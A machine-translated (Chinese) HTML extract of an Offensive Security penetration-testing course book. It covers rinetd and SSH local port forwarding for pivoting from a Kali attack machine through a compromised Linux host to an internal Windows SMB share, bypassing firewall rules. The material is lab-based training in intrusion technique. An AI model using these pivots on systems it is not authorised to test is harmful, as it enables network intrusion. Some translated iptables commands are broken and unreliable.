<div style="position:absolute;top:187302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：gws</font></font></nobr></div>
<div style="position:absolute;top:187319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-XSS-保护：0</font></font></nobr></div>
<div style="position:absolute;top:187336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Frame-Options: SAMEORIGIN</font></font></nobr></div>
<div style="position:absolute;top:187353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置-Cookie：1P_JAR=2019-08-26-15；</font><font style="vertical-align: inherit;">到期=周三，2019 年 9 月 25 日 15:46:18 GMT；</font><font style="vertical-align: inherit;">路径=/；</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多迈</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:187370;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n=.google.com</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:187387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置-Cookie：NID=188=Hdg-h4aalehFQUxAOvnI87Mtwcq80i07nQqBUfUwDWoXRcqf43KYuCoBEBGmOFmyu0</font></font></nobr></div>
<div style="position:absolute;top:187404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kXyWZCiHj0egWCfCxdote0ScMX6ArouU2jF4DZeeFHBhqZCvLJDV3ysgP​​zerRkk9pcLi7HenbeeEn5xR9BgWfz</font></font></nobr></div>
<div style="position:absolute;top:187421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4jvZkjnzYDwlfoL2ivk；</font><font style="vertical-align: inherit;">到期 = 星期二，2020 年 2 月 25 日 15:46:18 GMT；</font><font style="vertical-align: inherit;">路径=/；</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域=.google.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:187438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; </font><font style="vertical-align: inherit;">仅Http</font></font></nobr></div>
<div style="position:absolute;top:187455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:187474;left:204"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 631 - 通过我们的 Kali Linux 虚拟机成功访问外部 IP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:187503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到我们的 Linux 服务器成功，我们执行了成功的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求</font></font></nobr></div>
<div style="position:absolute;top:187523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对抗网络服务器。</font><font style="vertical-align: inherit;">由</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-Cookie</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段</font><font style="vertical-align: inherit;">证明</font><font style="vertical-align: inherit;">，连接已转发</font></font></nobr></div>
<div style="position:absolute;top:187542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确地，事实上，我们已经连接到谷歌的网络服务器。</font></font></nobr></div>
<div style="position:absolute;top:187575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以使用这种技术从我们以前断开 Internet 连接的 Linux 客户端连接，</font></font></nobr></div>
<div style="position:absolute;top:187594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Linux Web 服务器，只需更改连接到 Internet 的任何主机</font></font></nobr></div>
<div style="position:absolute;top:187614;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">connectaddress</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的ConnectPort</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在Web服务器的/etc/rinetd.conf文件中的字段。</font></font></nobr></div>
<div style="position:absolute;top:187646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 297 直观地总结了这个过程： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:187879;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="159"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 159 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:187912;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:188989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:188989;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:188989;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">600</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188397;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 297：出站流量过滤绕过</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是本模块中较为基本的场景之一。</font><font style="vertical-align: inherit;">一定要花时间完成</font></font></nobr></div>
<div style="position:absolute;top:188448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前练习并理解这些概念。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188482;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.1.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 连接到您的专用 Linux 实验室客户端并从以下位置运行 clear_rules.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:188532;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ 作为 root。</font></font></nobr></div>
<div style="position:absolute;top:188560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试复制上述场景中涵盖的端口转发技术。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2 SSH 隧道</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 协议</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">591</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是最流行的隧道和端口转发协议之一。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第592章</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:188658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是因为它能够在 SSH 协议中创建加密隧道，该协议支持双向</font></font></nobr></div>
<div style="position:absolute;top:188678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定向沟通渠道。</font><font style="vertical-align: inherit;">SSH 协议的这个不起眼的特性具有深远的影响</font></font></nobr></div>
<div style="position:absolute;top:188697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对渗透测试人员和系统管理员的影响。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188731;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:188731;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 本地端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:188769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地端口转发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们使用 SSH 作为远程服务器通过隧道将本地端口连接到远程服务器。</font></font></nobr></div>
<div style="position:absolute;top:188789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输协议。</font><font style="vertical-align: inherit;">这种技术的效果类似于 rinetd 端口转发，有一些</font></font></nobr></div>
<div style="position:absolute;top:188808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">曲折。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:188905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">591 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（SSH 通信安全，2018 年），https://www.ssh.com/ssh/protocol/</font></font></font></nobr></div>
<div style="position:absolute;top:188925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">592 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Trackets 博客，2017 年），https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:188940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子.html </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:189067;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="160"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 160 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:189100;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:190177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:190177;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:190177;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">601</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们考虑另一种情况。</font><font style="vertical-align: inherit;">在评估期间，我们妥协了一个</font></font></nobr></div>
<div style="position:absolute;top:189215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Linux 的目标通过远程漏洞，将我们的权限提升为 root，并获得访问权限</font></font></nobr></div>
<div style="position:absolute;top:189234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到机器上 root 和学生用户的密码。</font><font style="vertical-align: inherit;">这台受损机器</font></font></nobr></div>
<div style="position:absolute;top:189254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎没有任何出站流量过滤，它只暴露 SSH（端口 22）、RDP（端口</font></font></nobr></div>
<div style="position:absolute;top:189273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389) 和易受攻击的服务端口，防火墙也允许使用这些端口。</font></font></nobr></div>
<div style="position:absolute;top:189306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在枚举受感染的 Linux 客户端后，我们发现除了被连接</font></font></nobr></div>
<div style="position:absolute;top:189325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到当前网络 (10.11.0.x)，它有另一个似乎连接到的网络接口</font></font></nobr></div>
<div style="position:absolute;top:189344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不同的网络 (192.168.1.x)。</font><font style="vertical-align: inherit;">在这个内部子网中，我们确定了一个 Windows Server 2016</font></font></nobr></div>
<div style="position:absolute;top:189364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有可用网络共享的计算机。</font></font></nobr></div>
<div style="position:absolute;top:189397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了在我们的实验室环境中模拟此配置，我们将运行 ssh_local_port_forwarding.sh</font></font></nobr></div>
<div style="position:absolute;top:189416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们专用 Linux 客户端的脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:189468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:189502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 清除iptables规则</font></font></nobr></div>
<div style="position:absolute;top:189519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入接受</font></font></nobr></div>
<div style="position:absolute;top:189536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 向前接受</font></font></nobr></div>
<div style="position:absolute;top:189553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输出接受</font></font></nobr></div>
<div style="position:absolute;top:189570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:189587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -X</font></font></nobr></div>
<div style="position:absolute;top:189621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># SSH 场景</font></font></nobr></div>
<div style="position:absolute;top:189638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:189655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入删除</font></font></nobr></div>
<div style="position:absolute;top:189671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P FORWARD DROP</font></font></nobr></div>
<div style="position:absolute;top:189689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:189706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:189723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:189739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:189756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:189773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:189808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:189827;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 632 - ssh_local_port_forwarding.sh 脚本的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们可以将所需的攻击和枚举工具移动到受感染的</font></font></nobr></div>
<div style="position:absolute;top:189875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux机器然后尝试与2016服务器上的共享进行交互，但这既不是</font></font></nobr></div>
<div style="position:absolute;top:189895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优雅也不可扩展。</font><font style="vertical-align: inherit;">相反，我们希望通过基于 Internet 的 Kali 与这个新目标进行交互</font></font></nobr></div>
<div style="position:absolute;top:189914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击机器，通过这个受感染的 Linux 客户端。</font><font style="vertical-align: inherit;">这样，我们就可以访问</font></font></nobr></div>
<div style="position:absolute;top:189933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们与目标交互时 Kali 攻击机上的所有工具。</font></font></nobr></div>
<div style="position:absolute;top:189966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将需要一些端口转发魔法，我们将使用 ssh 客户端的本地端口转发</font></font></nobr></div>
<div style="position:absolute;top:189986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -L</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用</font><font style="vertical-align: inherit;">）来帮助解决这个问题。</font></font></nobr></div>
<div style="position:absolute;top:190019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -N -L [bind_address:]port:host:hostport [用户名@地址]</font></font></nobr></div>
<div style="position:absolute;top:190073;left:260"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 633 - 使用 SSH 进行本地端口转发的命令原型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看 ssh 客户端 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man ssh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">的手册</font><font style="vertical-align: inherit;">，我们注意到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数指定了</font></font></nobr></div>
<div style="position:absolute;top:190122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将转发到远程地址和端口的本地主机上的端口。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:190255;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="161"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 161 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:190288;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:191365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:191365;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:191365;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">602</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的场景中，我们希望在 Kali 上转发端口 445（没有 NetBIOS 的 Microsoft 网络）</font></font></nobr></div>
<div style="position:absolute;top:190403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器到 Windows Server 2016 目标上的端口 445。</font><font style="vertical-align: inherit;">当我们这样做时，任何 Microsoft 文件</font></font></nobr></div>
<div style="position:absolute;top:190422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对我们 Kali 机器的共享查询将被转发到我们的 Windows Server 2016 目标。</font></font></nobr></div>
<div style="position:absolute;top:190455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于防火墙阻止了 TCP 端口 445 上的流量，这似乎是不可能的，但是这个端口</font></font></nobr></div>
<div style="position:absolute;top:190475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forward 通过 SSH 会话通过隧道传输到我们在端口 22 上的 Linux 目标，该端口允许通过</font></font></nobr></div>
<div style="position:absolute;top:190494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙。</font><font style="vertical-align: inherit;">总之，请求将在端口 445 上击中我们的 Kali 机器，将通过</font></font></nobr></div>
<div style="position:absolute;top:190513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 会话，然后将传递到 Windows Server 2016 目标上的端口 445。</font></font></nobr></div>
<div style="position:absolute;top:190546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果操作正确，我们的隧道和转发设置将类似于图 298：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190969;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 298：本地端口转发图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了实现这一点，我们将从 Kali Linux 攻击机执行 ssh 命令。</font><font style="vertical-align: inherit;">我们不会</font></font></nobr></div>
<div style="position:absolute;top:191019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术上发出任何 ssh 命令（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-N</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），但会设置端口转发（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），绑定端口 445</font></font></nobr></div>
<div style="position:absolute;top:191039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的本地机器 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:445</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 到 Windows Server ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.110:445</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">上的端口 445</font><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:191058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过与我们原始 Linux 目标的会话来执行此操作，以学生身份登录</font></font></nobr></div>
<div style="position:absolute;top:191077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（学生@ </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.128</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</font></font></font></b></nobr></div>
<div style="position:absolute;top:191129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@10.11.0.128 的密码：  </font></font></nobr></div>
<div style="position:absolute;top:191149;left:142"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 634 - 将 Kali Linux 机器上的 TCP 端口 445 转发到 Windows Server 2016 上的 TCP 端口 445</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，Kali Linux 机器上 TCP 端口 445 上的任何传入连接都将被转发到</font></font></nobr></div>
<div style="position:absolute;top:191197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过我们受感染的 Linux 客户端，192.168.1.110 IP 地址上的 TCP 端口 445。</font></font></nobr></div>
<div style="position:absolute;top:191230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在测试之前，我们需要在我们的 Samba 配置文件中做一个小的改变来设置</font></font></nobr></div>
<div style="position:absolute;top:191249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在文件末尾添加“min protocol = SMB2”，将最小 SMB 版本转换为 SMBv2，如图所示</font></font></nobr></div>
<div style="position:absolute;top:191269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 635 中。这是因为 Windows Server 2016 默认不再支持 SMBv1。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:191443;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="162"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 162 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:191476;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:192553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:192553;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:192553;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">603</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nano /etc/samba/smb.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:191608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/samba/smb.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:191625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:191642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，您还需要设置适当的 Unix 权限</font></font></nobr></div>
<div style="position:absolute;top:191659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 到驱动程序目录，让这些用户在其中拥有写权限</font></font></nobr></div>
